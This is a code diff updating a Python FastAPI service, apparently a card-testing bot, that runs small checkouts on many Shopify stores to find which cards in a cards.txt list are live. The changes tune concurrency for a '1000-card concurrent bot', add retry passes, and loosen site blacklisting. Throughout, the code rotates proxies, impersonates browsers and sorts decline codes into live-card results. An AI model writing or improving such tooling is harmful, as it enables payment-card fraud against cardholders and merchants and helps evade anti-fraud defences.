@@ -1,20 +1,17 @@
 """
-Shopify Checkout Validator API — Stateless v4.3.0
+Shopify Checkout Validator API — Stateless v4.4.1
 
-ARCHITECTURE:
-  - Stateless. Client supplies fallback_sites per request. No shared pool.
-  - Single-attempt per call. msh.py owns retries. Transport-level retries
-    handled by curl_cffi internally (retry=3 on 5xx/connection resets).
-  - Structured response codes (SKIP_SITE / PROXY_ERROR / SITE_ERROR)
-    exposed as SkipSite flag + Response string so clients classify cleanly.
+v4.4.1 changes:
+  - SITE_CONCURRENCY default: 15 → 8 (better fit for 1000-card concurrent bot)
+  - REQUEST_TIMEOUT default: 35 → 12 (real checkout is <3s; 12s catches dead sites)
 
-CHANGES vs v4.2.0:
-  - _normalize_response: exact structured code table first (Shopify GraphQL
-    decline codes are stable — no more substring miscategorisation).
-  - Shipping proposal: single attempt. No internal retry.
-  - Submit: single attempt. No internal retry.
-  - Response now includes SkipSite=True for site-level rejects so callers
-    can skip the site without consuming retry budget.
+Full architecture unchanged from v4.4.0:
+  - Stateless. Client supplies fallback_sites per request.
+  - Single-attempt per call. msh.py owns retries.
+  - Structured response codes with SkipSite flag.
+  - Transient codes do not accumulate toward blacklist.
+  - _auto_validate runs transient retry pass before declaring exhaustion.
+  - SITES_EXHAUSTED is a distinct code from SITE_ERROR.
 """
 
 import asyncio
@@ -46,17 +43,19 @@ CARDS_FILE        = os.environ.get("CARDS_FILE", "cards.txt")
 MAX_PRICE         = float(os.environ.get("MAX_PRICE", 5.0))
 MIN_AMOUNT        = float(os.environ.get("MIN_AMOUNT", 0.50))
 HARD_MAX_PRICE    = float(os.environ.get("HARD_MAX_PRICE", 20.0))
-SITE_CONCURRENCY  = int(os.environ.get("SITE_CONCURRENCY", 15))
-AUTO_ATTEMPTS     = int(os.environ.get("AUTO_ATTEMPTS", 15))
+SITE_CONCURRENCY  = int(os.environ.get("SITE_CONCURRENCY", 8))
+AUTO_ATTEMPTS     = int(os.environ.get("AUTO_ATTEMPTS", 30))
 RACE_COUNT        = int(os.environ.get("RACE_COUNT", 3))
-BLACKLIST_THRESHOLD = float(os.environ.get("BLACKLIST_THRESHOLD", 0.85))
-BLACKLIST_SAMPLES   = int(os.environ.get("BLACKLIST_SAMPLES", 8))
-BLACKLIST_SECONDS   = int(os.environ.get("BLACKLIST_SECONDS", 60))
+
+BLACKLIST_THRESHOLD = float(os.environ.get("BLACKLIST_THRESHOLD", 0.92))
+BLACKLIST_SAMPLES   = int(os.environ.get("BLACKLIST_SAMPLES", 15))
+BLACKLIST_SECONDS   = int(os.environ.get("BLACKLIST_SECONDS", 30))
+
 CACHE_TTL         = float(os.environ.get("CACHE_TTL", 300))
 VARIANT_TTL       = float(os.environ.get("VARIANT_TTL", 1800))
 FAIL_CACHE_TTL    = float(os.environ.get("FAIL_CACHE_TTL", 300))
-THROTTLE_COOLDOWN = int(os.environ.get("THROTTLE_COOLDOWN", 900))
-REQUEST_TIMEOUT   = float(os.environ.get("REQUEST_TIMEOUT", 35))
+THROTTLE_COOLDOWN = int(os.environ.get("THROTTLE_COOLDOWN", 300))
+REQUEST_TIMEOUT   = float(os.environ.get("REQUEST_TIMEOUT", 12))
 LOG_LEVEL         = os.environ.get("LOG_LEVEL", "warning").upper()
 IMPERSONATE       = os.environ.get("IMPERSONATE", "chrome124")
 
@@ -66,7 +65,7 @@ VALID_API_KEYS = set(
 )
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# STRUCTURED RESPONSE CLASSIFICATIONS  (stable — never change)
+# STRUCTURED RESPONSE CLASSIFICATIONS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 KNOWN_CARD_RESPONSES = frozenset({
@@ -80,27 +79,28 @@ KNOWN_CARD_RESPONSES = frozenset({
     "SITE_VALIDATED",
 })
 
-# Site-level rejects: the card was never actually attempted. Caller should
-# try a different site without consuming any retry budget.
 SKIP_SITE_CODES = frozenset({
     "NO_PRODUCT", "NO_PRODUCT_FOUND", "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
     "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "THROTTLED",
     "CAPTCHA_REQUIRED",
 })
 
-# Proxy/connection errors: caller should rotate the proxy.
 PROXY_ERROR_CODES = frozenset({
     "PROXY_ERROR", "TIMEOUT", "API_REPLICAS_UNREACHABLE",
 })
 
-# Site errors: site itself failed mid-checkout. Caller should try a
-# different site but the site is temporarily blacklisted.
 SITE_ERROR_CODES = frozenset({
     "CHECKOUT_FAILED", "CART_FAILED", "GRAPHQL_ERROR", "SITE_ERROR",
     "SESSION_EXPIRED", "NEGOTIATE_FAILED", "NO_SESSION_TOKEN",
     "NO_ATTEMPT_TOKEN", "NO_SELLER_PROPOSAL", "CHECKPOINTDENIED",
     "SUBMIT_FAILED", "TOKENIZATION_FAILED", "ORDER_CREATION_FAILED",
     "NO_PAYMENT_REQUIRED",
+})
+
+TRANSIENT_CODES = frozenset({
+    "TIMEOUT", "THROTTLED", "PROXY_ERROR",
+    "API_REPLICAS_UNREACHABLE", "GRAPHQL_ERROR", "SITE_ERROR",
+    "CHECKOUT_FAILED", "CART_FAILED", "SESSION_EXPIRED",
 })
 
 HARD_DEAD_CODES = frozenset({
@@ -119,8 +119,6 @@ FINAL_CODES = frozenset({
     "SITE_VALIDATED",
 })
 
-# Only PROXY_ERROR stops auto-validate early so the caller can rotate proxy.
-# THROTTLED is per-site; auto-validate should move on to the next site.
 PROXY_STOP_CODES = frozenset({"PROXY_ERROR"})
 
 LIVE_RESPONSES = frozenset({
@@ -158,7 +156,7 @@ def _looks_like_proxy_error(msg: str) -> bool:
     return any(k in m for k in PROXY_ERROR_HINTS)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# GRAPHQL QUERY / MUTATION FRAGMENTS
+# GRAPHQL FRAGMENTS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 _PROPOSAL_VARS = (
@@ -354,7 +352,7 @@ USER_AGENTS = [
 ]
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# GLOBAL STATE  (stateless — no site pool)
+# GLOBAL STATE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 _site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
@@ -575,31 +573,24 @@ def _ua_headers(ua: str) -> dict:
     }
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# RESPONSE NORMALIZATION — exact structured codes first
+# RESPONSE NORMALIZATION
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 _EXACT_CODE_MAP = {
-    # Successful / charged
     "ORDER_PLACED":             "ORDER_PLACED",
     "PROCESSEDRECEIPT":         "ORDER_PLACED",
     "PAYMENT_COMPLETE":         "ORDER_PLACED",
-    # 3DS
     "AUTHENTICATION_REQUIRED":  "3DS_REQUIRED",
     "3DS_REQUIRED":             "3DS_REQUIRED",
     "OTP_REQUIRED":             "OTP_REQUIRED",
     "ACTION_REQUIRED":          "3DS_REQUIRED",
-    # CVC
     "INVALID_CVC":              "INVALID_CVC",
     "INCORRECT_CVC":            "INVALID_CVC",
     "CVC_DECLINED":             "INVALID_CVC",
-    # Funds
     "INSUFFICIENT_FUNDS":       "INSUFFICIENT_FUNDS",
-    # Expiry
     "EXPIRED_CARD":             "EXPIRED_CARD",
-    # Card invalid
     "INVALID_CARD":             "INVALID_CARD",
     "INVALID_NUMBER":           "INVALID_CARD",
-    # Declines
     "PAYMENT_METHOD_DECLINED":  "CARD_DECLINED",
     "DO_NOT_HONOR":             "CARD_DECLINED",
     "FRAUD_SUSPECTED":          "CARD_DECLINED",
@@ -613,12 +604,10 @@ _EXACT_CODE_MAP = {
     "GENERIC_DECLINE":          "CARD_DECLINED",
     "INVALID_PURCHASE_TYPE":    "CARD_DECLINED",
     "INVALID_PAYMENT_METHOD":   "CARD_DECLINED",
-    # Transient
     "THROTTLED":                "THROTTLED",
     "PROXY_ERROR":              "PROXY_ERROR",
     "TIMEOUT":                  "TIMEOUT",
     "CAPTCHA_REQUIRED":         "CAPTCHA_REQUIRED",
-    # Site-level
     "NO_PRODUCT":               "NO_PRODUCT",
     "NO_PRODUCT_FOUND":         "NO_PRODUCT_FOUND",
     "PRICE_TOO_HIGH":           "PRICE_TOO_HIGH",
@@ -630,12 +619,9 @@ def _normalize_response(raw: Optional[str]) -> str:
     if not raw:
         return "CARD_DECLINED"
     msg = str(raw).strip().upper()
-
-    # ─── Priority 1: exact structured code ───
     if msg in _EXACT_CODE_MAP:
         return _EXACT_CODE_MAP[msg]
 
-    # ─── Priority 2: substring fallback (localized messages) ───
     if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT",
                               "PAYMENT_COMPLETE", "ORDER_CREATED")):
         return "ORDER_PLACED"
@@ -739,6 +725,8 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
     return True, ""
 
 def _record_site_result(hostname: str, response_code: str) -> None:
+    if response_code in TRANSIENT_CODES:
+        return
     if response_code in PROXY_STOP_CODES:
         return
     s = _site_stats[hostname]
@@ -1287,7 +1275,6 @@ async def validate_card(
                     "cartMetafields": [],
                 }
 
-            # ─── Shipping proposal — SINGLE ATTEMPT ───
             ship_vars = _base_vars()
             try:
                 r = await session.post(
@@ -1652,7 +1639,6 @@ async def validate_card(
                     "operationName": "SubmitForCompletion",
                 }
 
-            # ─── Submit — SINGLE ATTEMPT ───
             try:
                 sr = await session.post(
                     graphql_url,
@@ -1857,16 +1843,18 @@ async def validate_card(
 # AUTO-VALIDATE
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-def _site_error_result(message: str, last_result: Optional[dict] = None) -> dict:
+def _site_error_result(message: str, last_result: Optional[dict] = None,
+                       exhausted: bool = False) -> dict:
+    code = "SITES_EXHAUSTED" if exhausted else "SITE_ERROR"
     return {
-        "Response": "SITE_ERROR",
+        "Response": code,
         "Message":  message,
         "Status":   False,
         "Gateway":  "Shopify Payments",
         "Price":    "0.00",
         "Proxy":    (last_result or {}).get("Proxy", "Live"),
-        "Retry":    True,
-        "SkipSite": False,
+        "Retry":    not exhausted,
+        "SkipSite": exhausted,
         "Time":     "0s",
     }
 
@@ -1892,15 +1880,20 @@ async def _auto_validate(
     ]
 
     if not candidates:
-        candidates = [s for s in pool if s not in exclude_set][:5]
+        forced_count = min(
+            len(pool) - len(exclude_set),
+            max(10, max_attempts),
+        )
+        candidates = [s for s in pool if s not in exclude_set][:forced_count]
         if candidates:
-            log.warning("[auto] pool fully quarantined — forcing %d anyway",
-                        len(candidates))
+            log.warning("[auto] pool fully quarantined — forcing %d", len(candidates))
 
     random.shuffle(candidates)
     candidates = candidates[:max_attempts]
 
     last_result: Optional[dict] = None
+    transient_failures: list[tuple[str, str]] = []
+
     for site in candidates:
         _stats["auto_total_attempts"] += 1
         result = await validate_card(cc, month, year, cvv, site,
@@ -1921,7 +1914,36 @@ async def _auto_validate(
         if code in PROXY_STOP_CODES:
             return result
 
-    return _site_error_result(f"All {len(candidates)} sites exhausted", last_result)
+        if code in TRANSIENT_CODES:
+            transient_failures.append((site, code))
+
+    if (transient_failures
+            and len(transient_failures) == len(candidates)
+            and len(candidates) > 0):
+        retry_count = min(
+            len(transient_failures),
+            max(3, max_attempts // 3),
+        )
+        log.warning(
+            "[auto] all %d sites returned transient errors — retrying %d after 2s",
+            len(candidates), retry_count,
+        )
+        await asyncio.sleep(2.0)
+        for site, _ in transient_failures[:retry_count]:
+            _stats["auto_total_attempts"] += 1
+            result = await validate_card(cc, month, year, cvv, site,
+                                         proxy_str=proxy_str, max_price=max_price)
+            last_result = result
+            code = str(result.get("Response", "")).upper()
+            if code in FINAL_CODES or code in PROXY_STOP_CODES:
+                log.info("[auto] SUCCESS on transient retry: %s", code)
+                return result
+
+    return _site_error_result(
+        f"All {len(candidates)} sites exhausted",
+        last_result,
+        exhausted=True,
+    )
 
 async def validate_card_raced(
     cc: str, month: str, year: str, cvv: str, sites: list[str],
@@ -1966,7 +1988,7 @@ async def validate_card_raced(
 # FASTAPI APP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-app = FastAPI(title="Shopify Validator", version="4.3.0")
+app = FastAPI(title="Shopify Validator", version="4.4.1")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -2223,7 +2245,7 @@ async def health_route():
     now = time.time()
     return JSONResponse({
         "status":             "ok",
-        "version":            "4.3.0",
+        "version":            "4.4.1",
         "mode":               "stateless",
         "cards_loaded":       len(cards),
         "site_concurrency":   SITE_CONCURRENCY,
@@ -2231,10 +2253,14 @@ async def health_route():
         "variant_ttl":        VARIANT_TTL,
         "fail_cache_ttl":     FAIL_CACHE_TTL,
         "throttle_cooldown":  THROTTLE_COOLDOWN,
+        "request_timeout":    REQUEST_TIMEOUT,
         "max_price":          MAX_PRICE,
         "min_amount":         MIN_AMOUNT,
         "hard_max_price":     HARD_MAX_PRICE,
         "auto_attempts":      AUTO_ATTEMPTS,
+        "blacklist_threshold": BLACKLIST_THRESHOLD,
+        "blacklist_samples":   BLACKLIST_SAMPLES,
+        "blacklist_seconds":   BLACKLIST_SECONDS,
         "impersonate":        IMPERSONATE,
         "keys_configured":    len(VALID_API_KEYS),
         "cached_products":    len(_product_cache),
